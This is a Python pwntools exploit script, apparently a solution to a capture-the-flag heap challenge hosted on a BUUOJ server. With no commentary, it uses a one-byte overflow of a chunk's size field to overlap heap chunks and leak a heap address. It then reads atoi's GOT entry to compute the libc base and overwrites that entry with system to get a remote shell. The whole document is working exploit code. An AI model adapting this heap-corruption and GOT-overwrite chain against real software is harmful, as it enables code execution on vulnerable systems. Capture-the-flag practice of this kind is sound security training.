from pwn import *



#r=process("./pwn")
r=remote("node5.buuoj.cn",27472)
def add_(size,content):
	r.recvuntil(b"Your choice :")
	r.sendline(b"1")
	r.recvuntil(b"Size of Heap(0x10 or 0x20 only) : ")
	r.sendline(str(size))
	r.recvuntil(b"Content:")
	r.send(content)
	return



def edi_(index,content):
	r.recvuntil(b"Your choice :")
	r.sendline(b"2")
	r.recvuntil(b"Index :")
	r.sendline(str(index))
	r.recvuntil(b"Content: ")
	r.send(content)
	return

def show_(index):
	r.recvuntil(b"Your choice :")
	r.sendline(b"3")
	r.recvuntil(b"Index :")
	r.sendline(str(index))
	return

def del_(index):
	r.recvuntil(b"Your choice :")
	r.sendline(b"4")
	r.recvuntil(b"Index :")
	r.sendline(str(index))
	return
pause()
add_(0x18,b'a')
add_(0x18,b'a')
edi_(0,b'a'*0x18+b'\x41')
del_(1)
add_(0x38,b'a')

add_(0x18,b'a')
add_(0x18,b'a')
edi_(2,b'a'*0x18+b'\x41')
del_(3)
add_(0x38,b'a')

edi_(3,b'a'*0x28)
show_(3)
r.recvuntil(b'a'*0x28)
heap_add=u64(r.recvuntil(b'\n')[:-1].ljust(8,b'\x00'))
print(hex(heap_add))


target_add=heap_add-0xb8
#r.interactive()
context.log_level='debug'
edi_(1,b'a'*0x20+p64(0x30)+p64(target_add))
pause()
def write_(tar,content):
	edi_(1,p64(tar))
	edi_(0,content)
	return

def leak_(tar):
	edi_(1,p64(tar))
	show_(0)
	return
atoi_got=0x602058
leak_(atoi_got)
r.recvuntil(b"Content : ")
libc_base=u64(r.recvuntil(b"\n")[:-1].ljust(8,b'\x00'))-0x40680
print(hex(libc_base))
#0x4f440
sys_add=libc_base+0x4f440
write_(atoi_got,p64(sys_add))
#r.sendline(b"/bin/sh")
r.interactive()

